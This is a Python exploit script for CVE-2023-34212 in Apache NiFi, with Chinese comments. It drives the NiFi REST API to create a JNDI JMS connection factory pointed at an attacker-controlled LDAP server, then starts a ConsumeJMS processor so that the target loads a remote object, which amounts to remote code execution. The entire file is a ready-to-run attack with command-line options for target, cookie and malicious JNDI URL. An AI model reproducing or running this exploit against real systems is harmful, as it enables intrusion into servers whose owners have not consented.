#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2023/6/15 下午6:18
# @Author  : Veraxy00
# @FileName: CVE-2023-34212.py
# @Software: PyCharm
import json
import requests
import argparse
import sys
from urllib.parse import urlparse, urlunparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

'''
获取client-id、process-groups-id、version
'''
def get_Info(target, InfoName ,cookie):
    if InfoName == "Client-id": # 获取client-id
        api_url = '/nifi-api/flow/client-id'
    elif InfoName == "Process-groups-id": # 获取process-groups-id
        api_url = '/nifi-api/flow/process-groups/root'
    elif InfoName == "Version": # 获取version
        api_url = '/nifi-api/system-diagnostics'
    url = urlunparse(target) + api_url
    headers = {'Host': target.netloc, 'Cookie': '__Host-Authorization-Bearer=' + cookie}
    r = requests.get(url, headers=headers, verify=False)
    if r.status_code == 200:
        print("Get "+ InfoName +"------------------Success")
        return r.text
    else:
        print("Get "+ InfoName +"------------------Failure")

def make_auth_request(url, host, data, method, cookie, module):
    headers = {'Host': host, 'Content-Type': 'application/json', 'Cookie': '__Host-Authorization-Bearer=' + cookie, 'Authorization': 'Bearer ' + cookie}
    r = requests.request(method, url, headers=headers, data=data, verify=False)
    if r.status_code == 201:
        print(module+"------------------Success")
        return r.text
    elif r.status_code == 200:
        print(module + "------------------Success")
        return r.text
    else:
        print(module+"------------------Failure")
'''
创建JndiJmsConnectionFactoryProvider控制器
'''
def Create_Controller(target, cookie, version,clientId, process_groups_id):
    url = urlunparse(target) +'/nifi-api/process-groups/'+ process_groups_id +'/controller-services'
    data = json.dumps({'revision':{'clientId':clientId,'version':0},'disconnectedNodeAcknowledged':False,'component':{'type':'org.apache.nifi.jms.cf.JndiJmsConnectionFactoryProvider','bundle':{'group':'org.apache.nifi','artifact':'nifi-jms-processors-nar','version':version},'name':'JndiJmsConnectionFactoryProvider00'}})
    return make_auth_request(url, target.netloc, data, 'post', cookie, "Create JndiJmsConnectionFactoryProvider")

'''
为指定JndiJmsConnectionFactoryProvider控制器编辑JNDI连接属性值
'''
def Edit_ControllerInfo(target, cookie, clientId, ControllerId, ControllerName, JNDI_Initial_Context_Factory_Class, JNDI_Provider_URL, JNDI_Name_of_the_Connection_Factory):
    url = urlunparse(target) + '/nifi-api/controller-services/' + ControllerId
    data = json.dumps({'disconnectedNodeAcknowledged':False,'component':{'id':ControllerId,'name':ControllerName,'comments':'','properties':{'java.naming.factory.initial':JNDI_Initial_Context_Factory_Class,'java.naming.provider.url':JNDI_Provider_URL,'connection.factory.name':JNDI_Name_of_the_Connection_Factory}},'revision':{'clientId':clientId,'version':1}})
    return make_auth_request(url, target.netloc, data, 'put', cookie, "Edit JndiJmsConnectionFactoryProvider")
'''
启动控制器
'''
def Enable_Controller(target, cookie, clientId, ControllerId):
    url = urlunparse(target) + '/nifi-api/controller-services/' + ControllerId + '/run-status'
    data = json.dumps({'revision':{'clientId':clientId,'version':2},'disconnectedNodeAcknowledged':False,'state':'ENABLED'})
    return make_auth_request(url, target.netloc, data, 'put', cookie, "Enable JndiJmsConnectionFactoryProvider")
'''
创建处理器
'''
def Create_Processor(target, cookie, clientId, process_groups_id, ProcessorType, ProcessorArtifact, ProcessorName,version):
    url = urlunparse(target) +'/nifi-api/process-groups/'+ process_groups_id +'/processors'
    data = json.dumps({'revision':{'clientId':clientId,'version':0},'disconnectedNodeAcknowledged':False,'component':{'type':ProcessorType,'bundle':{'group':'org.apache.nifi','artifact':ProcessorArtifact,'version':version},'name':ProcessorName,'position':{'x':427.15151515151524,'y':252.84848484848487}}})
    return make_auth_request(url, target.netloc, data, 'post', cookie, "Create Processor")
'''
为处理器创建关联关系
'''
def Create_ProcessorConnections(target, cookie, clientId, process_groups_id, SourceId, DestinationId):
    url = urlunparse(target)  + '/nifi-api/process-groups/' + process_groups_id + '/connections'
    data = json.dumps({'revision':{'clientId':clientId,'version':0},'disconnectedNodeAcknowledged':False,'component':{'name':'','source':{'id':SourceId,'groupId':process_groups_id,'type':'PROCESSOR'},'destination':{'id':DestinationId,'groupId':process_groups_id,'type':'PROCESSOR'},'selectedRelationships':['success'],'flowFileExpiration':'0 sec','backPressureDataSizeThreshold':'1 GB','backPressureObjectThreshold':'10000','bends':[],'prioritizers':[],'loadBalanceStrategy':'DO_NOT_LOAD_BALANCE','loadBalancePartitionAttribute':'','loadBalanceCompression':'DO_NOT_COMPRESS'}})
    return make_auth_request(url, target.netloc, data, 'post', cookie, "Create relationship for ConsumeJMS and LogAttribute")
'''
编辑ConsumeJMS处理器属性值，添加JndiJmsConnectionFactoryProvider、Destination Name
'''
def Edit_ProcessorInfo(target, cookie, clientId, Processorid ,Controllerid):
    url = urlunparse(target) + '/nifi-api/processors/' + Processorid
    data = json.dumps({'component':{'id':Processorid,'name':'ConsumeJMS','config':{'concurrentlySchedulableTaskCount':'1','schedulingPeriod':'0 sec','executionNode':'ALL','penaltyDuration':'30 sec','yieldDuration':'1 sec','bulletinLevel':'WARN','schedulingStrategy':'TIMER_DRIVEN','comments':'','autoTerminatedRelationships':[],'properties':{'Connection Factory Service':Controllerid,'Destination Name':'toNifi'}},'state':'STOPPED'},'revision':{'clientId':clientId,'version':2},'disconnectedNodeAcknowledged':False})
    return make_auth_request(url, target.netloc, data, 'put', cookie, "Edit ConsumeJMS")
'''
启动处理器
'''
def Enable_Processor(target, cookie, clientId, ProcessorId):
    url = urlunparse(target) + '/nifi-api/processors/' + ProcessorId + '/run-status'
    data = json.dumps({'revision':{'clientId':clientId,'version':3},'state':'RUNNING','disconnectedNodeAcknowledged':False})
    return make_auth_request(url, target.netloc, data, 'put', cookie, "Enable Processor")

def exploit(target, cookie, JNDI_Initial_Context_Factory_Class, JNDI_Provider_URL, JNDI_Name_of_the_Connection_Factory):
    # 获取Client-Id、process-groups-id、版本号
    ClientId = str(get_Info(target, "Client-id", cookie))
    process_groups_id = json.loads(get_Info(target, "Process-groups-id", cookie)).get('processGroupFlow').get('id')
    version = json.loads(get_Info(target, "Version",cookie)).get('systemDiagnostics').get('aggregateSnapshot').get('versionInfo').get('niFiVersion')

    # 创建JndiJmsConnectionFactoryProvider控制器
    Controller_Info = Create_Controller(target,cookie,version,ClientId,process_groups_id)
    # 提取JndiJmsConnectionFactoryProvider的id、name
    ControllerID = json.loads(Controller_Info).get('id')
    ControllerNAME = json.loads(Controller_Info).get('component').get('name')
    Edit_ControllerInfo(target,cookie,ClientId,ControllerID, ControllerNAME, JNDI_Initial_Context_Factory_Class, JNDI_Provider_URL, JNDI_Name_of_the_Connection_Factory)
    Enable_Controller(target,cookie,ClientId,ControllerID)

    # 创建ConsumeJMS处理器
    ConsumeJMS_Info = Create_Processor(target, cookie, ClientId, process_groups_id, 'org.apache.nifi.jms.processors.ConsumeJMS', 'nifi-jms-processors-nar', 'ConsumeJMS',version)
    # 创建LogAttribute处理器
    LogAttribute_Info = Create_Processor(target, cookie, ClientId, process_groups_id, 'org.apache.nifi.processors.standard.LogAttribute', 'nifi-standard-nar', 'LogAttribute',version)
    # 提取ConsumeJMS、LogAttribute的id
    ConsumeJMSID = json.loads(ConsumeJMS_Info).get('id')
    LogAttributeID = json.loads(LogAttribute_Info).get('id')
    # 创建连接(ConsumeJMS和LogAttribute)
    Create_ProcessorConnections(target, cookie, ClientId, process_groups_id, ConsumeJMSID, LogAttributeID)

    # 为ConsumeJMS处理器添加JndiJmsConnectionFactoryProvider控制器
    Edit_ProcessorInfo(target, cookie, ClientId, ConsumeJMSID, ControllerID)
    Enable_Processor(target, cookie, ClientId, ConsumeJMSID)
    print("Exploit------------------Success")

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='CVE-2023-34212 exploit')
        parser.add_argument('-t', '--target',help='target 指定目标NIFI系统的地址,必要参数. \neg: http://192.168.25.147:8080', required=True)
        parser.add_argument('-u', '--JndiUrl', help='JNDI服务监听地址,必要参数. eg: ldap://xx.xx.xx.xx:1389', required=True)
        parser.add_argument('-l', '--JndiFactoryLocation', help='访问JNDI实例对象地址,必要参数. \neg: ldap://xx.xx.xx.xx:1389/Evil', required=True)
        parser.add_argument('-c', '--cookieBearer', help='Cookie中Bearer值.')
        parser.add_argument('--JndiFactoryClass', help='JNDI工厂类. eg: com.sun.jndi.ldap.LdapCtxFactory', default='com.sun.jndi.ldap.LdapCtxFactory')
        args = parser.parse_args()
        #  提取命令行信息
        target = urlparse(args.target.rstrip('/'))
        JNDI_Initial_Context_Factory_Class = args.JndiFactoryClass
        JNDI_Provider_URL = args.JndiUrl
        JNDI_Name_of_the_Connection_Factory = args.JndiFactoryLocation
        if target.scheme == "https":
            if args.cookieBearer:
                cookie = args.cookieBearer
            else:
                print("缺少Cookie，请重新调用------------------Failure")
                sys.exit()
        else:
            cookie = ""
        exploit(target, cookie, JNDI_Initial_Context_Factory_Class, JNDI_Provider_URL, JNDI_Name_of_the_Connection_Factory)

    except Exception as e:
        print(e)